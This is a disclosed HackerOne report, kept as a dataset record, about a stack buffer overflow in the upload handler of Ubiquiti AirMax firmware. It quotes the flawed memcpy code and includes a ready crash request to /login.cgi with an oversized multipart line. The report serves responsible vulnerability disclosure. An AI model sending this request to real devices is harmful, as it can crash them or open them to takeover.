---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '74025'
original_report_id: '74025'
title: Yet another Buffer Overflow in PHP of the AirMax Products
weakness: Memory Corruption - Generic
team_handle: ui
created_at: '2015-07-05T17:04:12.735Z'
disclosed_at: '2016-04-07T22:00:33.249Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 3
tags:
- hackerone
- memory-corruption-generic
---

# Yet another Buffer Overflow in PHP of the AirMax Products

## Metadata

- HackerOne Report ID: 74025
- Weakness: Memory Corruption - Generic
- Program: ui
- Disclosed At: 2016-04-07T22:00:33.249Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

It's me again!

After the Report [#73491](https://hackerone.com/reports/73491) and the [#74004](https://hackerone.com/reports/74004), I bring another Buffer Overflow, this one look more like #74004, which is a overflow in stack.

Has you can see bellow, is copied to the var `line` a content (POST data in this case) which can go beyond the content of the original variable. 
```
int ub_process_content(struct upload_buffer* ub)
{
	char  line[512];
	size_t length;
	
/** some code **/
		if ((~ub->got) & GOT_BOUNDARY) {
			eol = (char*)memmem(ptr, size, "\r\n", 2);
			if (!eol) break;

			length = eol - ptr + 2;
			memcpy(line, ptr, length); //!!Problem!!//
			line[length] = 0;

	/** some code **/
}
```

All what we need its a line with more than 512 bytes, example of request:
```
POST /login.cgi HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: curl/7.43.0
Accept: */*
Content-Length: 700
Content-Type: multipart/form-data; boundary=------------------------2ad2f036dd647428

--------------------------2ad2f036dd647428asdfasdfasdfasdfasdfasdfsdasdfasdfasdfasdfasdfasdfdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd2ad2f036dd647428asdfasdfasdfasdfasdfasdfsdasdfasdfasdfasdfasdfasdfdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd
Content-Disposition: form-data; name="file"; filename="AAA"
Content-Type: application/octet-stream

AAAA
--------------------------2ad2f036dd647428--
```

When the var `ptr` point to the first line (of the POST content) it will have more the 512  bytes until "\r\n" and will overflow  the var `line`. As always it will cause a segmentation fault (probably because of overwriting of the return pointer), and the cgi will die with the return of the code 11, identical to the report #74004.

Sorry if I'am Bothering you with to much reports, I will wait your reply (or one week) to send another ones.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
